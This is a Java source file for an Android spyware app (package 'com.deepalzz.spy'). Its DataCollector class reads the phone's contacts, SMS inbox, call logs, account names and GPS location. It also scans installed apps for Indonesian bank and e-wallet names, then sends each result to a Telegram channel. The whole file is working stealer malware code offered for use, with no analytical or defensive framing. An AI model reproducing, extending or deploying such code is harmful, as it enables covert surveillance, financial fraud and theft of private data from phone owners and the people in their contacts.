package com.deepalzz.spy;
import android.Manifest; import android.content.ContentResolver; import android.content.Context;
import android.content.pm.PackageManager; import android.database.Cursor; import android.location.Location;
import android.location.LocationManager; import android.net.Uri; import android.provider.ContactsContract;
import androidx.core.app.ActivityCompat; import java.text.SimpleDateFormat; import java.util.Locale;
public class DataCollector {
    private Context ctx; private TelegramSender tg; private SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
    public DataCollector(Context ctx, TelegramSender tg) { this.ctx = ctx; this.tg = tg; }
    public void collectContacts() {
        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("📇 CONTACTS:\n");
        ContentResolver cr = ctx.getContentResolver();
        Cursor c = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) { int i=0; while (c.moveToNext() && i<30) {
            String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String num = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            sb.append(name).append(": ").append(num).append("\n"); i++;
        } c.close(); if (i>0) tg.sendMessage(sb.toString()); }
    }
    public void collectSMS() {
        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("💬 SMS:\n");
        ContentResolver cr = ctx.getContentResolver();
        Cursor c = cr.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 15");
        if (c != null) { while (c.moveToNext()) {
            String body = c.getString(c.getColumnIndex("body"));
            String addr = c.getString(c.getColumnIndex("address"));
            if (body != null && body.length()>0) sb.append(addr).append(": ").append(body).append("\n\n");
        } c.close(); tg.sendMessage(sb.toString()); }
    }
    public void collectCallLogs() {
        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("📞 CALL LOGS:\n");
        ContentResolver cr = ctx.getContentResolver();
        Cursor c = cr.query(Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 15");
        if (c != null) { while (c.moveToNext()) {
            String num = c.getString(c.getColumnIndex("number"));
            String type = c.getString(c.getColumnIndex("type"));
            String dur = c.getString(c.getColumnIndex("duration"));
            String t = type.equals("1") ? "IN" : type.equals("2") ? "OUT" : "MISSED";
            sb.append(t).append(" ").append(num).append(" (").append(dur).append("s)\n");
        } c.close(); tg.sendMessage(sb.toString()); }
    }
    public void collectAccounts() {
        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) return;
        StringBuilder sb = new StringBuilder("🔑 ACCOUNTS:\n");
        android.accounts.AccountManager am = (android.accounts.AccountManager) ctx.getSystemService(Context.ACCOUNT_SERVICE);
        android.accounts.Account[] accs = am.getAccounts();
        for (android.accounts.Account a : accs) sb.append(a.name).append("\n");
        if (accs.length > 0) tg.sendMessage(sb.toString());
    }
    public void collectLocation() {
        if (ActivityCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return;
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        try { Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc != null) tg.sendMessage("📍 LOCATION: " + loc.getLatitude() + "," + loc.getLongitude() +
                "\nhttps://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude());
        } catch (SecurityException e) {}
    }
    public void collectInstalledApps() {
        StringBuilder sb = new StringBuilder("📲 APPS:\n");
        PackageManager pm = ctx.getPackageManager();
        java.util.List<android.content.pm.ApplicationInfo> apps = pm.getInstalledApplications(0);
        for (android.content.pm.ApplicationInfo a : apps) {
            String name = pm.getApplicationLabel(a).toString().toLowerCase();
            if (name.contains("bank") || name.contains("bca") || name.contains("mandiri") ||
                name.contains("bri") || name.contains("bni") || name.contains("ovo") ||
                name.contains("gopay") || name.contains("dana") || name.contains("wallet")) {
                sb.append("💰 ").append(name).append("\n");
            }
        }
        if (sb.length() > 50) tg.sendMessage(sb.toString());
    }
    public void collectWalletData() { collectInstalledApps(); }
}
